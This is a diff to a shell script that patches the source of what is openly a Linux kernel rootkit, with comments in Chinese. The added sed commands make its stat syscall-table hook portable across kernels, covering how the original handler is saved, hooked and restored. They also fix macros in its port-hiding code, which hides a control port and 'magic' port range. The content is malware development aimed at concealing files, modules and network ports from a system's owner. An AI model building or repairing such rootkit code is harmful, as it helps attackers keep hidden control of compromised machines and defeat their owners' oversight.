@@ -86,6 +86,34 @@ sed -i.bak '/original_proc_modules_fops ? "Yes" : "No"/c\
         "Not Supported"\
 #endif' module_hiding.c
 
+echo "修复 file_hiding.c 中的 __NR_newfstat 兼容性问题..."
+
+# 修复 original_stat 赋值
+sed -i.bak 's/original_stat = (void \*)sys_call_table\[__NR_newfstat\];/#ifdef __NR_newfstat\n    original_stat = (void *)sys_call_table[__NR_newfstat];\n#elif defined(__NR_fstat)\n    original_stat = (void *)sys_call_table[__NR_fstat];\n#else\n    original_stat = NULL;\n    printk(KERN_WARNING "[rootkit] stat syscall not available\\n");\n#endif/' file_hiding.c
+
+# 修复 sys_call_table 中的 __NR_newfstat 使用
+sed -i.bak 's/sys_call_table\[__NR_newfstat\] = (unsigned long)hooked_stat;/#ifdef __NR_newfstat\n        sys_call_table[__NR_newfstat] = (unsigned long)hooked_stat;\n#elif defined(__NR_fstat)\n        sys_call_table[__NR_fstat] = (unsigned long)hooked_stat;\n#endif/' file_hiding.c
+
+# 修复 cleanup 函数中的 sys_call_table 恢复
+sed -i.bak 's/sys_call_table\[__NR_newfstat\] = (unsigned long)original_stat;/#ifdef __NR_newfstat\n        if (sys_call_table[__NR_newfstat]) {\n            sys_call_table[__NR_newfstat] = (unsigned long)original_stat;\n        }\n#elif defined(__NR_fstat)\n        if (sys_call_table[__NR_fstat]) {\n            sys_call_table[__NR_fstat] = (unsigned long)original_stat;\n        }\n#endif/' file_hiding.c
+
+echo "修复 port_hiding.c 中的函数重定义和宏定义问题..."
+
+# 删除重复的 is_magic_port 函数定义
+sed -i.bak '/\/\/ 检查是否为魔术端口/,/^}/c\
+// 注意：is_magic_port函数已在rootkit.h中定义，这里不需要重复定义' port_hiding.c
+
+# 修复 should_hide_port 函数中的宏使用
+sed -i.bak 's/is_magic_port(port) || ntohs(port) == ROOTKIT_PORT/is_magic_port(ntohs(port)) || ntohs(port) == CONTROL_PORT/' port_hiding.c
+
+# 修复 get_hidden_ports_info 函数中的宏使用
+sed -i.bak 's/MAGIC_PORT_RANGE_START/MAGIC_PORT_START/g' port_hiding.c
+sed -i.bak 's/MAGIC_PORT_RANGE_END/MAGIC_PORT_END/g' port_hiding.c
+sed -i.bak 's/ROOTKIT_PORT/CONTROL_PORT/g' port_hiding.c
+
+# 删除重复的函数声明
+sed -i.bak '/static int is_magic_port(__be16 port);/d' port_hiding.c
+
 echo "✅ 修复完成"
 
 # 验证修复
